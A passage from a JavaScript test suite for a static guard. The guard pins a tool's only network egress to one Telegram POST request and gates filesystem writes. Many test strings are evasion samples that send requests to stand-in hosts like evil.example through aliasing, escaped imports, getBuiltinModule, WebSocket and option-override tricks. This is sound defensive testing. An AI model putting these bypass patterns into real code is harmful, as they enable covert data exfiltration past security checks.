    ok(rules(scan('cutover-audit.mjs', "Object.getOwnPropertyDescriptor(globalThis, 'fetch').value('https://evil.example/x', {});")).includes('global-fetch-gate'));
  });
  it('a spread that overrides the pinned init → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), ...evil });")).includes('global-fetch-gate'));
  });
  it('a duplicate later method key overriding the pinned one → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), method: 'GET' });")).includes('global-fetch-gate'));
  });
  it('a bare timeout: option (Node fetch ignores it, no signal) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', timeout: 5000 });")).includes('global-fetch-gate'));
  });
  it('an operator-guarded signal (never || AbortSignal.timeout) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: never || AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('a second pinned-shape send (different token) → global-fetch-gate', () => {
    const src = "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });\n"
      + "fetch('https://api.telegram.org/bot9/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });";
    ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
  });

  // Fail-CLOSED must not over-reject the legitimate forms.
  it('a fetch-mentioning string in a non-registered file is NOT flagged (no over-reject)', () => {
    deepStrictEqual(scan('cutover-audit.mjs', 'const help = "fetch(url, init)";'), []);
  });
  it("the former full pinned fetch call in notify.mjs is now rejected (transport swapped to node:https) → global-fetch-gate", () => {
    const src = "const token = 't'; const payload = {}; "
      + "fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000), body: JSON.stringify(payload), headers: { 'Content-Type': 'application/json' } });";
    ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
  });

  // Codex round-3 — the round-2 fixes' own residual holes.
  it('a fetch inside a template ${...} interpolation (executable code) → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "const leak = `${await fetch('https://evil.example/x', { method: 'GET' })}`;")).includes('global-fetch-gate'));
  });
  it('a padded Reflect.get(globalThis, <spaces> "fetch") → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis,                              'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
  });
  it('a getter property overriding a pinned key at runtime → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5), get redirect() { return 'follow'; } });")).includes('global-fetch-gate'));
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — ADR-0041 §2d node:https egress (transport fix)
// ---------------------------------------------------------------------------

describe('ADR-0041 §2d guard — pinned node:https egress (per-source negative conformance)', () => {
  // The pinned E1 node:https transport the `impl` slice will add to notify.mjs (the
  // fetch → node:https swap): a direct `https.request(url, options)` to the fixed
  // Telegram host, method POST, a bounded timeout, URL a template whose STATIC prefix
  // is the allowlisted origin (token interpolated only AFTER it). node:https does NOT
  // follow redirects, so there is no redirect key — a redirect-FOLLOW would need a
  // SECOND request, which maxCalls forbids. The IPv4-preferred→fallback is a loop
  // around this SINGLE call site (varying only the non-pinned `family`).
  const IMPORT = "import https from 'node:https';";
  // The bound is `signal: AbortSignal.timeout(...)` (auto-aborting) — the only statically
  // verifiable timeout (a bare `timeout:` option merely emits an event; see MAJOR-2 below).
  // The options carry ONLY the allowlisted keys method/family/signal/timeout/headers.
  const PINNED = `${IMPORT} const token = 't'; https.request(\`https://api.telegram.org/bot\${token}/sendMessage\`, { method: 'POST', family: 4, signal: AbortSignal.timeout(5000), headers: { 'content-type': 'application/json' } }, (res) => {});`;

  it('the pinned Telegram node:https request in notify.mjs → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', PINNED), []);
  });

  it('the same via a namespace import (import * as https) → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', "import * as https from 'node:https'; https.request(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', signal: AbortSignal.timeout(5000) });"), []);
  });

  it('a bounded AbortSignal.timeout is the only accepted timeout → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', signal: AbortSignal.timeout(5000) });`), []);
  });

  it('a bare timeout: option (no auto-abort, Codex MAJOR) → pinned-https-gate', () => {
    // A bare `timeout:` only emits a 'timeout' event; it does not abort the socket, so it
    // cannot be statically verified to bound the request — signal is required.
    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: TELEGRAM_API_TIMEOUT_MS });`)).includes('pinned-https-gate'));
  });

  // --- ADR-0041 §2d fail-closed matrix ---------------------------------------
  it('non-notify egress: the pinned request in another runtime file → import-gate', () => {
    ok(rules(scan('cutover-audit.mjs', PINNED)).includes('import-gate'));
  });

  it('a non-POST method → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'GET', timeout: 5000 });`)).includes('pinned-https-gate'));
  });

  it('a non-allowlisted origin → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://evil.example.com/send', { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
  });

  it('a userinfo-trick lookalike origin (api.telegram.org@evil.com) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org@evil.com/x', { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
  });

  it('the origin-only-but-wrong-endpoint (/deleteWebhook) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/deleteWebhook', { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
  });

  it('a missing timeout → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST' });`)).includes('pinned-https-gate'));
  });

  it('an explicitly-disabled timeout (timeout: 0) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 0 });`)).includes('pinned-https-gate'));
  });

  it('redirect-following (a SECOND manual request to a Location) → pinned-https-gate (maxCalls)', () => {
    const src = `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`
      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`;
    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
  });

  it('a non-literal (variable) URL → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request(url, { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
  });

  it('URL via concatenation defeating the pinned literal → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot' + evil, { method: 'POST', timeout: 5000 });`)).includes('pinned-https-gate'));
  });

  // --- indirection (defeats static pinned validation) ------------------------
  it('an aliased request (const r = https.request) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} const r = https.request; r(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
  });

  it('a destructured request (const { request } = https) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} const { request } = https; request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
  });

  it("a computed request (https['request']) → pinned-https-gate", () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https['request']('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
  });

  it('a .call-applied request (https.request.call) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request.call(null, 'https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
  });

  it('a namespace alias then member call (const agent = https; agent.request(evil)) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} const agent = https; agent.request('https://evil.example/x', { method: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
  });

  it('the binding passed as a value (registerTransport(https)) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} registerTransport(https);`)).includes('pinned-https-gate'));
  });

  it('a named primitive import (import { request } from node:https) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', "import { request } from 'node:https'; request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5 });")).includes('pinned-https-gate'));
  });

  it('a dynamic import of node:https in notify.mjs → import-gate', () => {
    ok(rules(scan('notify.mjs', "const https = await import('node:https');")).includes('import-gate'));
  });

  // --- other network methods on the binding (only request is permitted) ------
  it('any OTHER https member method (https.get) → pinned-https-gate', () => {
    const src = `${IMPORT} https.get('https://api.telegram.org/x', () => {});`
      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', timeout: 5 });`;
    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
  });

  // --- init-object override hazards (mirror the fetch hardening) -------------
  it('a spread that overrides the pinned options → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5, ...evil });`)).includes('pinned-https-gate'));
  });

  it('a duplicate later method key overriding the pinned one → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', timeout: 5, method: 'GET' });`)).includes('pinned-https-gate'));
  });

  it('a getter property overriding a pinned key at runtime → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', get timeout() { return 0; } });`)).includes('pinned-https-gate'));
  });

  it('a computed method key (dynamic injection) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { ['method']: 'POST', timeout: 5 });`)).includes('pinned-https-gate'));
  });

  // --- Fail-CLOSED must not over-reject the legitimate forms -----------------
  it('a node:https-mentioning string in a non-registered file is NOT flagged (no over-reject)', () => {
    deepStrictEqual(scan('cutover-audit.mjs', 'const help = "https.request(url, options)";'), []);
  });

  it('the pinned tokens buried in a nested string, real request is GET → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'GET', timeout: 5, note: "method:'POST'" });`)).includes('pinned-https-gate'));
  });

  it('the full realistic call (template URL + JSON body + headers + callback) → NO finding', () => {
    const src = `${IMPORT} const token = 't'; const body = JSON.stringify({}); `
      + "const req = https.request(`https://api.telegram.org/bot${token}/sendMessage`, "
      + "{ method: 'POST', family: 4, signal: AbortSignal.timeout(5000), headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) } }, (res) => { res.resume(); });";
    deepStrictEqual(scan('notify.mjs', src), []);
  });

  it('the IPv4-preferred→fallback retry as a LOOP around a single call site → NO finding (not over-rejected)', () => {
    // The impl shape maxCalls:1 permits: ONE `https.request(` call site, invoked in a
    // family-retry loop (only the non-pinned `family` varies). The binding appears ONLY
    // in the import + this one member call → aliasedNamespace stays false; req.write/
    // req.end/req.on are on the ClientRequest, not the binding. NOTE: the guard proves the
    // SHAPE is pinned + single-site; it does NOT prove the idempotency invariant ("no retry
    // after a body write") — that is a runtime/behavioral property the acceptance-gate
    // subtask + the §2b unit test enforce (Codex plan-verify MAJOR, acknowledged boundary).
    const src = `${IMPORT} const token = 't'; const body = '{}';`
      + " async function send() { for (const family of [4, undefined]) {"
      + " const req = https.request(`https://api.telegram.org/bot${token}/sendMessage`,"
      + " { method: 'POST', family, signal: AbortSignal.timeout(TELEGRAM_API_TIMEOUT_MS), headers: { 'content-type': 'application/json' } },"
      + " (res) => { res.resume(); }); req.on('error', () => {}); req.write(body); req.end(); } }";
    deepStrictEqual(scan('notify.mjs', src), []);
  });

  // --- direct validator unit tests (import-gate-independent) ------------------
  const SPEC = registry.PINNED_HTTPS_USERS['notify.mjs'];
  const S = 'signal: AbortSignal.timeout(5000)';
  it('validatePinnedHttpsRequest: the pinned shape → null', () => {
    strictEqual(validatePinnedHttpsRequest(`\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S} }`, SPEC), null);
  });
  it('validatePinnedHttpsRequest: 2 or 3 args allowed, 1 or 4 rejected', () => {
    strictEqual(validatePinnedHttpsRequest(`\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S} }, cb`, SPEC), null);
    ok(typeof validatePinnedHttpsRequest("`https://api.telegram.org/bot${t}/sendMessage`", SPEC) === 'string');
    ok(typeof validatePinnedHttpsRequest(`\`https://api.telegram.org/bot\${t}/sendMessage\`, {}, cb, extra`, SPEC) === 'string');
  });
  it('validatePinnedHttpsRequest: each pinned-shape violation → a string', () => {
    for (const bad of [
      `'https://evil/x', { method: 'POST', ${S} }`,                       // origin
      `\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'GET', ${S} }`, // method
      "`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST' }",            // no timeout mechanism
      "`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', timeout: 5000 }", // bare timeout, no signal
      `url, { method: 'POST', ${S} }`,                                    // non-literal url
      `\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S}, hostname: 'evil.com' }`, // override key
      `\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${S} } && { method: 'GET' }`,  // trailing expr
    ]) ok(typeof validatePinnedHttpsRequest(bad, SPEC) === 'string', `expected a violation for: ${bad}`);
  });

  // --- the findImports lone-default fix this gate depends on ------------------
  it('findImports now parses a LONE default capability import (fail-open hole closed)', () => {
    const { staticImports } = findImports("import https from 'node:https';");
    deepStrictEqual(staticImports, [{ module: 'node:https', names: [{ imported: 'default', local: 'https' }], namespace: null }]);
    // and it still parses named / namespace / default+named forms unchanged
    strictEqual(findImports("import { get } from 'node:https';").staticImports[0].names[0].imported, 'get');
    strictEqual(findImports("import * as h from 'node:https';").staticImports[0].namespace, 'h');
    strictEqual(findImports("import https, { get } from 'node:https';").staticImports[0].names.length, 2);
  });

  it('a lone-default capability import in a NON-importer file → import-gate (was previously invisible)', () => {
    ok(rules(scan('worktree.mjs', "import cp from 'node:child_process';")).includes('import-gate'));
  });

  // --- Codex plan-verify hardening (bypasses the first pass missed) -----------
  const OK = 'signal: AbortSignal.timeout(5)';

  // CRITICAL: node:https merges options OVER the URL — a connection-redirect key escapes
  // the pinned host. Only method/family/signal/timeout/headers are allowlisted.
  for (const key of ['hostname', 'host', 'path', 'port', 'protocol', 'socketPath', 'href', 'lookup', 'agent', 'createConnection', 'rejectUnauthorized']) {
    it(`an options override key (${key}) redirecting off the pinned host → pinned-https-gate`, () => {
      ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK}, ${key}: x });`)).includes('pinned-https-gate'));
    });
  }
  it('a stray non-allowlisted option key (proxy) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK}, proxy: 'http://evil' });`)).includes('pinned-https-gate'));
  });

  // CRITICAL: multiple node:https bindings — one validated while another egresses unchecked.
  it('multiple bindings (import https, * as h) — the unchecked evil egress is caught → pinned-https-gate', () => {
    const src = `import https, * as h from 'node:https';`
      + ` https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`
      + ` h.request('https://evil.example.com/x', { method: 'GET', ${OK} });`;
    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
  });
  it('two separate node:https import statements → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `import https from 'node:https'; import h from 'node:https'; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
  });

  // CRITICAL: any named import from node:https (incl. string-literal `'request' as r`).
  it('a renamed named import (import { request as r }) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `import { request as r } from 'node:https'; r('https://evil.example.com/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
  });
  it('a default + named import (import https, { get }) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `import https, { get } from 'node:https'; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
  });

  // CRITICAL: createRequire re-opens require() of any capability module.
  it('createRequire from node:module (dynamic require of node:https) → import-gate', () => {
    const src = "import { createRequire } from 'node:module'; const req = createRequire(import.meta.url);"
      + " const h = req('node:https'); h.request('https://evil.example.com/x', {});";
    ok(rules(scan('notify.mjs', src)).includes('import-gate'));
  });

  // MAJOR: fetch + node:https both active in the same file = double-send.
  it('both a pinned fetch AND a pinned https.request active (double-send) → pinned-https-gate', () => {
    const src = `${IMPORT} fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', ${OK} });`
      + ` https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`;
    ok(rules(scan('notify.mjs', src)).includes('pinned-https-gate'));
  });

  // MAJOR: a trailing operator/expression after the options object ( {pinned} && {evil} ).
  it('a trailing && expression after the https options object → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} } && { method: 'GET' });`)).includes('pinned-https-gate'));
  });
  it('the same trailing-expression hole on the fetch path is also closed → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) } && { method: 'GET', redirect: 'follow' });")).includes('global-fetch-gate'));
  });

  // MINOR: a computed-request mention INSIDE a string must not over-reject (strings blanked).
  it('a computed-request string mention in a registered file is NOT over-rejected', () => {
    deepStrictEqual(scan('notify.mjs', `${IMPORT} const help = "https['request'](url)"; https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
  });

  // --- Codex round-2 (adversarial re-verify) hardening -----------------------
  // CRITICAL: `$` is a valid identifier char AND a regex metacharacter — an unescaped
  // binding voids the analysis. The binding must be regex-escaped everywhere.
  it('a $-containing binding still validates the pinned call → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', `import h$ from 'node:https'; h$.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
  });
  it('a $-containing binding egressing elsewhere is still caught → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `import h$ from 'node:https'; h$.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
  });

  // CRITICAL: a non-ASCII / \u-escaped binding evades the ASCII findImports grammar — the
  // guard fails closed on the unparseable capability import (its module string is ASCII).
  it('a non-ASCII import binding (import η from node:https) → import-gate (fail-closed on unparseable)', () => {
    ok(rules(scan('notify.mjs', `import η from 'node:https'; η.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('import-gate'));
  });
  it('a \\u-escaped import binding → import-gate', () => {
    ok(rules(scan('notify.mjs', "import h\\u0074tps from 'node:https'; x.request('https://evil.example/x', {});")).includes('import-gate'));
  });
  it('a legit ASCII import PLUS an evasive non-ASCII one → import-gate (count mismatch)', () => {
    const src = `import https from 'node:https'; import η from 'node:https';`
      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`
      + ` η.request('https://evil.example/x', {});`;
    ok(rules(scan('notify.mjs', src)).includes('import-gate'));
  });

  // CRITICAL: process.getBuiltinModule (Node ≥22.3) loads a builtin without import/require.
  it('process.getBuiltinModule(node:https) → import-gate', () => {
    ok(rules(scan('notify.mjs', "const https = process.getBuiltinModule('node:https'); https.request('https://evil.example/x', {});")).includes('import-gate'));
  });
  it('a destructured getBuiltinModule → import-gate', () => {
    ok(rules(scan('notify.mjs', "const { getBuiltinModule } = process; const h = getBuiltinModule('node:https'); h.request('https://evil.example/x', {});")).includes('import-gate'));
  });
  it('a mere string mention of getBuiltinModule is NOT flagged (no over-reject)', () => {
    deepStrictEqual(scan('cutover-audit.mjs', 'const doc = "avoid process.getBuiltinModule here";'), []);
  });

  // MINOR: an explicit object KEY named like the binding ({ https: true }) is not a value
  // leak and must not over-reject; a shorthand ({ https }) IS a value leak and is caught.
  it('an object key named like the binding ({ https: true }) is NOT over-rejected', () => {
    deepStrictEqual(scan('notify.mjs', `${IMPORT} const meta = { https: true }; https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
  });
  it('a binding shorthand ({ https }) IS a value leak → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} const o = { https }; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
  });

  // --- Codex round-3 (final adversarial re-verify) hardening -----------------
  // CRITICAL: a decoy import-looking STRING must not neutralize the unparseable-import check.
  it('a decoy import string + a real non-ASCII import → import-gate (decoy neutralization defeated)', () => {
    const src = `const doc = "import https from 'node:https'"; import η from 'node:https';`
      + ` η.request('https://evil.example/x', { method: 'GET', ${OK} });`;
    ok(rules(scan('notify.mjs', src)).includes('import-gate'));
  });

  // CRITICAL: a `$`-terminated binding used as a value/destructure (the `\b` boundary bug).
  it('a $-binding aliased as a value (const agent = h$) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `import h$ from 'node:https'; const agent = h$; agent.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
  });
  it('a $-binding destructured (const { request } = h$) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `import h$ from 'node:https'; const { request } = h$; request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('pinned-https-gate'));
  });

  // CRITICAL: computed-string getBuiltinModule (process['getBuiltinModule']).
  it("computed process['getBuiltinModule'] → import-gate", () => {
    ok(rules(scan('notify.mjs', "const https = process['getBuiltinModule']('node:https'); https.request('https://evil.example/x', {});")).includes('import-gate'));
  });

  // CRITICAL: escaped module specifiers resolve to a watched builtin off the literal watch list.
  it('an escaped module specifier (node:http\\u0073) in a static import → import-gate', () => {
    ok(rules(scan('notify.mjs', `import https from 'node:http\\u0073'; https.request('https://evil.example/x', { method: 'GET', ${OK} });`)).includes('import-gate'));
  });
  it('an escaped module specifier in a dynamic import()/require() → import-gate', () => {
    ok(rules(scan('notify.mjs', "const h = await import('node:http\\u0073');")).includes('import-gate'));
    ok(rules(scan('notify.mjs', "const h = require('node:http\\u0073');")).includes('import-gate'));
  });

  // CRITICAL: non-request namespace surfaces (any binding member access other than request(...)).
  it('a deeper namespace surface (https.globalAgent.createConnection) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} https.globalAgent.createConnection({ host: 'evil.example', port: 443 }, () => {});`)).includes('pinned-https-gate'));
  });
  it('a non-request method captured as a value (const g = https.get) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} const g = https.get; g('https://evil.example/x', () => {});`)).includes('pinned-https-gate'));
  });

  // HIGH: a local AbortSignal shadow makes the signal bound untrusted.
  it('a local AbortSignal shadow in the egress file → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} const AbortSignal = { timeout() { return undefined; } }; https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} });`)).includes('pinned-https-gate'));
  });

  // --- Codex round-4 (convergence) hardening ---------------------------------
  // HIGH: the AbortSignal shadow must be caught in EVERY binding form, incl. a PARAMETER.
  it('an AbortSignal PARAMETER shadow (function f(AbortSignal)) → pinned-https-gate', () => {
    ok(rules(scan('notify.mjs', `${IMPORT} function f(AbortSignal) { https.request('https://api.telegram.org/bot0/sendMessage', { method: 'POST', ${OK} }); }`)).includes('pinned-https-gate'));
  });
  // A legitimate single `AbortSignal.timeout(...)` use is NOT flagged.
  it('a legitimate single AbortSignal.timeout use is NOT over-rejected', () => {
    deepStrictEqual(scan('notify.mjs', `${IMPORT} https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`), []);
  });

  // CRITICAL: the global WebSocket (Node ≥22) is an import-less egress primitive.
  it('the global WebSocket in a runtime script → global-websocket-gate', () => {
    ok(rules(scan('notify.mjs', "const ws = new WebSocket('wss://evil.example/x'); ws.send('x');")).includes('global-websocket-gate'));
  });
  it('WebSocket in ANY runtime file (not just the egress file) → global-websocket-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "const ws = new WebSocket('wss://evil.example/x');")).includes('global-websocket-gate'));
  });
  it('a mere string mention of WebSocket is NOT flagged', () => {
    deepStrictEqual(scan('cutover-audit.mjs', 'const doc = "do not open a WebSocket";'), []);
  });

  // Regression: a pinned request alongside a legit \u-bearing scrub regex (as in the real
  // notify.mjs control-char scrub) must NOT be over-rejected by the WebSocket/AbortSignal/
  // escaped-identifier checks (which is why escaped-USE is a documented §2b residual).
  it('a pinned request next to a \\u-bearing control-scrub regex → NO finding', () => {
    const src = `${IMPORT} const SCRUB = /[\\u0000-\\u001F\\u007F-\\u009F]/g; const clean = raw.replace(SCRUB, '');`
      + ` https.request(\`https://api.telegram.org/bot\${t}/sendMessage\`, { method: 'POST', ${OK} });`;
    deepStrictEqual(scan('notify.mjs', src), []);
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — ADR-0044 S3b fs mutation modeling
// ---------------------------------------------------------------------------

describe('ADR-0044 S3b guard — fs mutation gates (per-source negative conformance)', () => {
  // --- fs-mutation-gate: which file may bind which mutating primitive -------
  it('a mutating fs import in an UNREGISTERED file → fs-mutation-gate', () => {
    ok(rules(scan('footer.mjs', "import { writeFile } from 'node:fs/promises';")).includes('fs-mutation-gate'));
  });
  it('an unregistered primitive in a REGISTERED file (unlink in consensus) → fs-mutation-gate', () => {
    ok(rules(scan('consensus.mjs', "import { mkdir, writeFile, unlink } from 'node:fs/promises';")).includes('fs-mutation-gate'));
  });
  it('an aliased mutating import (rm as cleanup) is still gated → fs-mutation-gate', () => {
    ok(rules(scan('footer.mjs', "import { rm as cleanup } from 'node:fs/promises';")).includes('fs-mutation-gate'));
  });
  it('a default-import member mutation call in an unregistered file → fs-mutation-gate', () => {
    ok(rules(scan('footer.mjs', "import fs from 'node:fs'; fs.writeFileSync(p, d);")).includes('fs-mutation-gate'));
  });
  it('a namespace-import member mutation call (fsp.rename) in an unregistered file → fs-mutation-gate', () => {
    ok(rules(scan('footer.mjs', "import * as fsp from 'node:fs/promises'; await fsp.rename(a, b);")).includes('fs-mutation-gate'));
  });
  it('an unregistered member primitive on a registered default import (fs.utimesSync in notify) → fs-mutation-gate', () => {
    ok(rules(scan('notify.mjs', "import fs from 'node:fs'; fs.utimesSync(p, a, m);")).includes('fs-mutation-gate'));
  });
  it('read-only named fs imports stay quiet (no over-reject)', () => {
    deepStrictEqual(scan('footer.mjs', "import { readFile, readdir } from 'node:fs/promises'; const t = await readFile(p, 'utf8');"), []);
  });
  it('a read-only default fs import with NO mutation member calls stays quiet', () => {
    deepStrictEqual(scan('runtime-config.mjs', "import fs from 'node:fs'; const t = fs.readFileSync(p, 'utf8'); const s = fs.statSync(p);"), []);
  });
  it('a registered file using exactly its registered primitives stays quiet', () => {
    deepStrictEqual(scan('consensus.mjs', "import { mkdir, writeFile } from 'node:fs/promises'; await mkdir(d, { recursive: true }); await writeFile(p, t);"), []);
  });

  // --- fs-open-gate: read-only or O_EXCL-create, never overwrite/append -----
  it("an exclusive-create open ('wx') in a registered file → NO finding", () => {
    deepStrictEqual(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, 'wx');"), []);
  });
  it("an overwrite open ('w') → fs-open-gate", () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, 'w');")).includes('fs-open-gate'));
  });
  it("an append open ('a') → fs-open-gate", () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, 'a');")).includes('fs-open-gate'));
  });
  it("a read-write open ('r+') → fs-open-gate", () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, 'r+');")).includes('fs-open-gate'));
  });
  it("a read open ('r') → NO finding", () => {
    deepStrictEqual(scan('bootstrap-artifacts.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, 'r');"), []);
  });
  it('an O_CREAT-without-O_EXCL constants expression → fs-open-gate', () => {
    ok(rules(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, fsConstants.O_WRONLY | fsConstants.O_CREAT);")).includes('fs-open-gate'));
  });
  it('an O_CREAT|O_EXCL constants expression → NO finding', () => {
    deepStrictEqual(scan('context.mjs', "import { open } from 'node:fs/promises'; const h = await open(p, fsConstants.O_WRONLY | fsConstants.O_CREAT | fsConstants.O_EXCL);"), []);
  });
